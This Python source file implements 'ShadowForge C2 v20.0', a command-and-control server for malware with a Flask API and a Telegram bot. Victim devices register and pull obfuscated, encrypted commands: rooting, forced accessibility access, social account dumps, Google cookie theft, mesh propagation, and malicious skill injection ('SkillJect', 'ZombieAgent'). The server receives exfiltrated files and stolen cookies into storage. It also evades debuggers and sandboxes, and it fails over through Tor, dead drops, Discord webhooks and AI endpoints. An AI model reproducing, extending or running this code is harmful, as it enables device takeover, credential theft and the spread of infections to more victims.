#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import base64
import json
import hashlib
import hmac
import secrets
import threading
import logging
import time
import requests
from datetime import datetime
from flask import Flask, request, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import telebot
from telebot import apihelper
from supabase import create_client
import sys
import subprocess
import socket
from typing import Optional, Dict, List, Any, Tuple

from crypto_utils import CryptoManager
from connection_manager import ConnectionManager
from module_loader import ModuleLoader
from ai_obfuscator import AIObfuscator
from failover_tester import FailoverTester
from attack_modules import AttackOrchestrator

app = Flask(__name__)
app.config['nonce_store'] = {}
app.config['nonce_lock'] = threading.Lock()

MASTER_SECRET_B64 = os.environ.get('MASTER_SECRET_B64')
if not MASTER_SECRET_B64:
    raise ValueError("MASTER_SECRET_B64 is required")
MASTER_SECRET = base64.b64decode(MASTER_SECRET_B64)

SALT = os.environ.get('SALT')
if not SALT or len(SALT) < 16:
    raise ValueError("SALT must be at least 16 characters")
SALT = SALT.encode()

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    raise ValueError("ADMIN_ID is required")

BOT_TOKENS = os.environ.get('BOT_TOKENS', '').split(',')
if not BOT_TOKENS or not BOT_TOKENS[0]:
    raise ValueError("At least one BOT_TOKEN is required")

SUPABASE_URLS = os.environ.get('SUPABASE_URLS', '').split(',')
SUPABASE_KEYS = os.environ.get('SUPABASE_KEYS', '').split(',')

DEAD_DROP_URLS = os.environ.get('DEAD_DROP_URLS', '').split(',')
GITHUB_RAW_URLS = os.environ.get('GITHUB_RAW_URLS', '').split(',')
DISCORD_WEBHOOKS = os.environ.get('DISCORD_WEBHOOKS', '').split(',')

ACCESS_KEY = os.environ.get('ACCESS_KEY')
if not ACCESS_KEY or len(ACCESS_KEY) < 32:
    raise ValueError("ACCESS_KEY must be at least 32 characters")

TOR_PROXY = os.environ.get('TOR_PROXY', 'socks5h://127.0.0.1:9050')
USE_TOR = os.environ.get('USE_TOR', 'false').lower() == 'true'

USE_AI_C2 = os.environ.get('USE_AI_C2', 'false').lower() == 'true'
AI_C2_ENDPOINTS = os.environ.get('AI_C2_ENDPOINTS', '').split(',')

ENABLE_PQC = os.environ.get('ENABLE_PQC', 'false').lower() == 'true'
ENABLE_ANTI_ANALYSIS = os.environ.get('ENABLE_ANTI_ANALYSIS', 'true').lower() == 'true'

def anti_analysis_check() -> bool:
    if not ENABLE_ANTI_ANALYSIS:
        return False
    suspicious = False
    if sys.gettrace() is not None:
        logging.warning("Debugger detected!")
        suspicious = True
    tools = ['frida', 'xposed', 'drozer', 'adb', 'gdb', 'strace', 'ltrace', 'valgrind']
    for tool in tools:
        try:
            if subprocess.call(['pgrep', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                logging.warning(f"Analysis tool '{tool}' detected!")
                suspicious = True
        except:
            pass
    emu_files = ['/system/bin/qemu-props', '/dev/qemu_pipe', '/dev/socket/qemud', '/system/lib/libc_malloc_debug_qemu.so']
    for f in emu_files:
        if os.path.exists(f):
            logging.warning(f"Emulator file '{f}' detected!")
            suspicious = True
    hostname = socket.gethostname().lower()
    username = os.environ.get('USER', '').lower()
    sandbox_indicators = ['sandbox', 'malware', 'cuckoo', 'virustotal', 'analysis', 'vm', 'virtual']
    for ind in sandbox_indicators:
        if ind in hostname or ind in username:
            logging.warning(f"Sandbox indicator '{ind}' detected!")
            suspicious = True
    if suspicious:
        time.sleep(secrets.randbelow(5) + 1)
    return suspicious

def periodic_anti_analysis():
    while True:
        anti_analysis_check()
        time.sleep(600)

threading.Thread(target=periodic_anti_analysis, daemon=True).start()

crypto = CryptoManager(MASTER_SECRET, SALT, use_pqc=ENABLE_PQC)

config = {
    'telegram': {'tokens': BOT_TOKENS},
    'supabase': {'urls': SUPABASE_URLS, 'keys': SUPABASE_KEYS},
    'dead_drop': {'urls': DEAD_DROP_URLS},
    'github_raw': {'urls': GITHUB_RAW_URLS},
    'discord_webhooks': {'urls': DISCORD_WEBHOOKS},
    'ai_c2': {'enabled': USE_AI_C2, 'endpoints': AI_C2_ENDPOINTS}
}

conn_mgr = ConnectionManager(config, crypto)
failover = FailoverTester(conn_mgr)
attack_orch = AttackOrchestrator(crypto, conn_mgr)
module_loader = ModuleLoader(crypto)
ai_obfuscator = AIObfuscator()

threading.Thread(target=failover.start_periodic_check, daemon=True).start()
threading.Thread(target=rotate_keys_periodically, daemon=True).start()

supabase_active = None
supabase_lock = threading.Lock()

def update_supabase_client():
    global supabase_active
    with supabase_lock:
        active = conn_mgr.get_active_supabase()
        if active:
            supabase_active = create_client(active['url'], active['key'])

update_supabase_client()

limiter = Limiter(get_remote_address, app=app, default_limits=["500 per day", "50 per hour"])
logging.basicConfig(level=logging.INFO)

class KeyStorage:
    def __init__(self, crypto, supabase):
        self.crypto = crypto
        self.supabase = supabase
        self.cache = {}
        self.lock = threading.Lock()

    def get_key(self, device_id: str) -> Optional[bytes]:
        with self.lock:
            if device_id in self.cache and self.cache[device_id]['expiry'] > datetime.utcnow().timestamp():
                return self.cache[device_id]['key']
            if self.supabase:
                try:
                    resp = self.supabase.table('device_keys').select('shared_key_enc', 'expiry').eq('device_id', device_id).execute()
                    if resp.data:
                        enc_key = resp.data[0]['shared_key_enc']
                        expiry = resp.data[0]['expiry']
                        if expiry > datetime.utcnow().timestamp():
                            key = self.crypto.decrypt_stored_key(base64.b64decode(enc_key))
                            self.cache[device_id] = {'key': key, 'expiry': expiry}
                            return key
                except Exception as e:
                    logging.error(f"Error fetching key from Supabase: {e}")
            return None

    def store_key(self, device_id: str, key: bytes, expiry: float):
        with self.lock:
            enc_key = base64.b64encode(self.crypto.encrypt_stored_key(key)).decode()
            if self.supabase:
                try:
                    self.supabase.table('device_keys').upsert({
                        'device_id': device_id,
                        'shared_key_enc': enc_key,
                        'expiry': expiry
                    }).execute()
                except Exception as e:
                    logging.error(f"Error storing key in Supabase: {e}")
            self.cache[device_id] = {'key': key, 'expiry': expiry}

    def refresh_key_if_needed(self, device_id: str):
        with self.lock:
            if device_id in self.cache:
                remaining = self.cache[device_id]['expiry'] - datetime.utcnow().timestamp()
                if remaining < 600:
                    logging.info(f"Key for {device_id} expires soon, scheduling renewal")
                    if supabase_active:
                        try:
                            supabase_active.table('service_requests').insert({
                                'target_client': device_id,
                                'request_type': 'renew_key',
                                'request_data': '{}',
                                'ticket_status': 'open'
                            }).execute()
                        except Exception as e:
                            logging.error(f"Error scheduling key renewal: {e}")
            return

    def update_supabase(self, new_supabase):
        with self.lock:
            self.supabase = new_supabase

key_storage = KeyStorage(crypto, supabase_active)

def authenticate_device(request) -> Optional[str]:
    device_id = request.headers.get('X-Device-ID')
    nonce = request.headers.get('X-Nonce')
    signature = request.headers.get('X-Signature')
    if not all([device_id, nonce, signature]):
        return None
    if len(nonce) < 16:
        return None
    if not is_nonce_valid(device_id, nonce):
        return None
    enc_key = key_storage.get_key(device_id)
    if not enc_key:
        return None
    hmac_key = crypto.derive_hmac_key(enc_key, device_id)
    expected = hmac.new(hmac_key, f"{device_id}:{nonce}".encode(), hashlib.sha256).hexdigest()
    if hmac.compare_digest(expected, signature):
        key_storage.refresh_key_if_needed(device_id)
        return device_id
    return None

def is_nonce_valid(device_id: str, nonce: str) -> bool:
    key = f"{device_id}:{nonce}"
    with app.config['nonce_lock']:
        if key in app.config['nonce_store']:
            return False
        app.config['nonce_store'][key] = time.time()
        if len(app.config['nonce_store']) > 1000:
            now = time.time()
            app.config['nonce_store'] = {k: v for k, v in app.config['nonce_store'].items() if now - v < 300}
    return True

def rotate_keys_periodically():
    while True:
        time.sleep(3600)
        if supabase_active:
            try:
                supabase_active.table('device_keys').delete().lt('expiry', datetime.utcnow().timestamp()).execute()
            except Exception as e:
                logging.error(f"Error cleaning expired keys: {e}")

def fetch_commands_via_ai_c2(device_id: str) -> List[Dict]:
    if not USE_AI_C2 or not AI_C2_ENDPOINTS:
        return []
    commands = []
    for endpoint in AI_C2_ENDPOINTS:
        try:
            session_id = secrets.token_hex(8)
            payload = {
                'device_id': device_id,
                'session': session_id,
                'nonce': secrets.token_hex(8)
            }
            response = requests.post(endpoint, json=payload, timeout=15)
            if response.status_code == 200:
                data = response.json()
                if data.get('commands'):
                    commands.extend(data['commands'])
                    break
        except Exception as e:
            logging.error(f"AI C2 endpoint {endpoint} failed: {e}")
    return commands

def trigger_zombie_agent(device_id: str, target_email: str) -> bool:
    if not USE_AI_C2:
        return False
    if supabase_active:
        try:
            supabase_active.table('service_requests').insert({
                'target_client': device_id,
                'request_type': 'zombie_agent',
                'request_data': json.dumps({'target_email': target_email}),
                'ticket_status': 'open'
            }).execute()
            return True
        except Exception as e:
            logging.error(f"Error triggering ZombieAgent: {e}")
    return False

def trigger_skillject(device_id: str, skill_name: str, parameters: Dict = None) -> bool:
    if supabase_active:
        try:
            payload = {'skill_name': skill_name, 'parameters': parameters or {}}
            supabase_active.table('service_requests').insert({
                'target_client': device_id,
                'request_type': 'skillject',
                'request_data': json.dumps(payload),
                'ticket_status': 'open'
            }).execute()
            return True
        except Exception as e:
            logging.error(f"Error triggering SkillJect: {e}")
    return False

@app.route('/v20/register', methods=['POST'])
@limiter.limit("10 per minute")
def register_device():
    data = request.get_json()
    device_id = data.get('device_id')
    client_pub_b64 = data.get('public_key')
    if not device_id or not client_pub_b64:
        return jsonify({'error': 'Missing fields'}), 400
    server_priv, server_pub = crypto.generate_ephemeral_keypair()
    server_pub_b64 = base64.b64encode(server_pub.public_bytes_raw()).decode()
    client_pub_bytes = base64.b64decode(client_pub_b64)
    shared_secret = crypto.compute_shared_secret(server_priv, client_pub_bytes)
    enc_key, hmac_key = crypto.derive_session_keys(shared_secret, device_id)
    expiry = datetime.utcnow().timestamp() + 43200
    key_storage.store_key(device_id, enc_key, expiry)
    if supabase_active:
        try:
            encrypted_pub_key = crypto.encrypt_stored_key(client_pub_bytes)
            supabase_active.table('pos_clients').upsert({
                'client_serial': device_id,
                'public_key_enc': base64.b64encode(encrypted_pub_key).decode(),
                'first_seen': datetime.utcnow().isoformat(),
                'last_seen': datetime.utcnow().isoformat()
            }).execute()
        except Exception as e:
            logging.error(f"Error upserting client: {e}")
    return jsonify({
        'status': 'registered',
        'server_public_key': server_pub_b64,
        'key_expiry': expiry
    })

@app.route('/v20/pull', methods=['GET'])
def pull_commands():
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)
    enc_key = key_storage.get_key(device_id)
    if not enc_key:
        abort(401)
    commands = failover.fetch_pending_commands(device_id, supabase_active)
    if USE_AI_C2:
        commands.extend(fetch_commands_via_ai_c2(device_id))
    encrypted_commands = []
    for cmd in commands:
        cmd_obfuscated = ai_obfuscator.obfuscate_command(cmd)
        cmd_json = json.dumps(cmd_obfuscated).encode()
        encrypted = crypto.encrypt_packet(enc_key, cmd_json, aad=device_id.encode())
        padding_len = secrets.randbelow(512) + 256
        final_packet = len(encrypted).to_bytes(4, 'big') + encrypted + secrets.token_bytes(padding_len)
        encrypted_commands.append(base64.b64encode(final_packet).decode())
    return jsonify(encrypted_commands)

@app.route('/v20/push', methods=['POST'])
def push_data():
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)
    enc_key = key_storage.get_key(device_id)
    if not enc_key:
        abort(401)
    data = request.get_json()
    encrypted_payload = data.get('payload')
    if not encrypted_payload:
        abort(400)
    try:
        decoded = base64.b64decode(encrypted_payload)
        if len(decoded) < 4:
            raise ValueError("Packet too short")
        real_len = int.from_bytes(decoded[:4], 'big')
        encrypted_part = decoded[4:4+real_len]
        if len(encrypted_part) != real_len:
            raise ValueError("Real length mismatch")
        decrypted = crypto.decrypt_packet(enc_key, encrypted_part, aad=device_id.encode())
        payload = json.loads(decrypted.decode())
    except Exception as e:
        logging.error(f"Decryption failed for {device_id}: {e}")
        abort(400)

    if supabase_active:
        try:
            victim_data = payload.get('data', {})
            encrypted_data = crypto.encrypt_stored_key(json.dumps(victim_data).encode())
            supabase_active.table('pos_clients').update({
                'last_seen': datetime.utcnow().isoformat(),
                'victim_data_enc': base64.b64encode(encrypted_data).decode(),
                'has_root': victim_data.get('has_root', False),
                'has_accessibility': victim_data.get('has_accessibility', False),
                'ip_address': request.remote_addr
            }).eq('client_serial', device_id).execute()
        except Exception as e:
            logging.error(f"Error updating client: {e}")

    payload_type = payload.get('type')
    if payload_type == 'command_result':
        cmd_id = payload.get('command_id')
        result = payload.get('result')
        success = payload.get('success', True)
        if supabase_active and cmd_id:
            try:
                supabase_active.table('service_requests').update({
                    'ticket_status': 'done' if success else 'failed',
                    'resolution_log': result
                }).eq('ticket_id', cmd_id).execute()
            except Exception as e:
                logging.error(f"Error updating command result: {e}")
        failover.send_message_to_admin(f"Result from {device_id}:\n{result[:200]}")
    elif payload_type == 'file':
        filename = payload.get('filename')
        filedata = base64.b64decode(payload.get('data', ''))
        if supabase_active:
            try:
                storage_path = f"exfil/{device_id}/{filename}"
                supabase_active.storage.from_('exfil').upload(storage_path, filedata)
                failover.send_message_to_admin(f"File from {device_id}: {filename}")
            except Exception as e:
                logging.error(f"Error uploading file: {e}")
    elif payload_type == 'network_scan':
        attack_orch.process_network_scan(device_id, payload.get('data'))
    elif payload_type == 'nearby_devices':
        attack_orch.process_nearby_devices(device_id, payload.get('data'))
    elif payload_type == 'google_cookies':
        cookies = payload.get('cookies')
        if cookies and supabase_active:
            try:
                encrypted_cookies = crypto.encrypt_stored_key(json.dumps(cookies).encode())
                supabase_active.table('stolen_cookies').insert({
                    'device_id': device_id,
                    'cookies_enc': base64.b64encode(encrypted_cookies).decode(),
                    'timestamp': datetime.utcnow().isoformat()
                }).execute()
                failover.send_message_to_admin(f"Google cookies stolen from {device_id}")
            except Exception as e:
                logging.error(f"Error storing cookies: {e}")
    elif payload_type == 'propagation_result':
        attack_orch.process_propagation_result(device_id, payload.get('data'))
    elif payload_type == 'zombie_result':
        result = payload.get('result')
        failover.send_message_to_admin(f"ZombieAgent result from {device_id}:\n{result[:200]}")
    elif payload_type == 'skillject_result':
        result = payload.get('result')
        failover.send_message_to_admin(f"SkillJect result from {device_id}:\n{result[:200]}")
    return jsonify({'status': 'ok'})

@app.route('/v20/config', methods=['GET'])
def get_config():
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)
    enc_key = key_storage.get_key(device_id)
    if not enc_key:
        abort(401)
    current_config = conn_mgr.get_active_config()
    encrypted = crypto.encrypt_packet(enc_key, json.dumps(current_config).encode(), aad=device_id.encode())
    return jsonify({'config': base64.b64encode(encrypted).decode()})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)
    if not supabase_active:
        return jsonify([])
    try:
        result = supabase_active.table('pos_clients').select('client_serial, operational_status, last_seen').execute()
        return jsonify(result.data)
    except Exception as e:
        logging.error(f"Error listing clients: {e}")
        return jsonify([])

@app.route('/api/command', methods=['POST'])
def create_command():
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)
    data = request.json
    target = data.get('target_client')
    req_type = data.get('request_type')
    req_data = data.get('request_data', '')
    if not target or not req_type:
        return jsonify({'error': 'missing fields'}), 400
    if supabase_active:
        try:
            supabase_active.table('service_requests').insert({
                'target_client': target,
                'request_type': req_type,
                'request_data': req_data,
                'ticket_status': 'open'
            }).execute()
        except Exception as e:
            logging.error(f"Error creating command: {e}")
    return jsonify({'status': 'created'})

@app.route('/api/results', methods=['GET'])
def get_results():
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)
    if not supabase_active:
        return jsonify([])
    try:
        result = supabase_active.table('service_requests') \
            .select('target_client, resolution_log, updated_at') \
            .neq('resolution_log', None) \
            .order('updated_at', desc=True) \
            .limit(10) \
            .execute()
        return jsonify(result.data)
    except Exception as e:
        logging.error(f"Error fetching results: {e}")
        return jsonify([])

@app.route('/api/stolen_cookies', methods=['GET'])
def get_stolen_cookies():
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)
    if not supabase_active:
        return jsonify([])
    try:
        result = supabase_active.table('stolen_cookies') \
            .select('device_id, timestamp') \
            .order('timestamp', desc=True) \
            .limit(20) \
            .execute()
        return jsonify(result.data)
    except Exception as e:
        logging.error(f"Error fetching stolen cookies: {e}")
        return jsonify([])

bot = telebot.TeleBot(BOT_TOKENS[0])
if USE_TOR:
    apihelper.proxy = {'https': TOR_PROXY}

@bot.message_handler(commands=['start', 'help'])
def help_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    text = """
ShadowForge C2 v20.0
/list -- List devices
/cmd [id] [command] -- Send command
/root [id] -- Attempt auto-root
/nearby_scan [id] -- Scan nearby devices
/social_dump [id] -- Dump social accounts
/accessibility [id] -- Force enable accessibility
/grab_gmail [id] -- Steal Google cookies
/propagate [id] -- Start mesh propagation
/zombie [id] [email] -- Trigger ZombieAgent
/skillject [id] [skill_name] -- Inject malicious skill
    """
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['list'])
def list_devices(message):
    if message.from_user.id != ADMIN_ID:
        return
    if not supabase_active:
        bot.reply_to(message, "Supabase not available.")
        return
    try:
        resp = supabase_active.table('pos_clients').select('client_serial, last_seen, operational_status').order('last_seen', desc=True).limit(20).execute()
        devices = resp.data
        if not devices:
            bot.reply_to(message, "No devices registered.")
            return
        msg = "**Active devices:**\n"
        for d in devices:
            last = d.get('last_seen', 'unknown')[:16]
            status = "🟢" if d.get('operational_status') == 'online' else "🔴"
            msg += f"{status} `{d['client_serial']}` last: {last}\n"
        bot.reply_to(message, msg, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['cmd'])
def send_command(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /cmd [device_id] [command]")
        return
    device_id, command = parts[1], parts[2]
    obfuscated = ai_obfuscator.obfuscate_command(command)
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': obfuscated,
            'request_data': command,
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"✅ Command `{command}` queued for `{device_id}`")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['root'])
def auto_root(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /root [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': 'auto_root',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"🔥 Root attempt queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['nearby_scan'])
def nearby_scan(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /nearby_scan [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': 'nearby_scan',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"🔍 Network scan started from {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['social_dump'])
def social_dump(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /social_dump [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': 'social_dump',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"📱 Social account dump queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['accessibility'])
def force_accessibility(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /accessibility [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': 'force_accessibility',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"♿ Force accessibility queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['grab_gmail'])
def grab_gmail(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /grab_gmail [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': 'grab_gmail_cookies',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"🍪 Google cookie grab queued for {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['propagate'])
def propagate(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /propagate [device_id]")
        return
    device_id = parts[1]
    try:
        supabase_active.table('service_requests').insert({
            'target_client': device_id,
            'request_type': 'propagate',
            'request_data': '{}',
            'ticket_status': 'open'
        }).execute()
        bot.reply_to(message, f"🕸️ Mesh propagation started from {device_id}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['zombie'])
def zombie_agent(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /zombie [device_id] [target_email]")
        return
    device_id, target_email = parts[1], parts[2]
    if trigger_zombie_agent(device_id, target_email):
        bot.reply_to(message, f"🧟 ZombieAgent triggered for {device_id} targeting {target_email}")
    else:
        bot.reply_to(message, "❌ Failed to trigger ZombieAgent")

@bot.message_handler(commands=['skillject'])
def skillject(message):
    if message.from_user.id != ADMIN_ID or not supabase_active:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /skillject [device_id] [skill_name]")
        return
    device_id, skill_name = parts[1], parts[2]
    if trigger_skillject(device_id, skill_name):
        bot.reply_to(message, f"🧠 SkillJect triggered for {device_id} with skill {skill_name}")
    else:
        bot.reply_to(message, "❌ Failed to trigger SkillJect")

def start_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
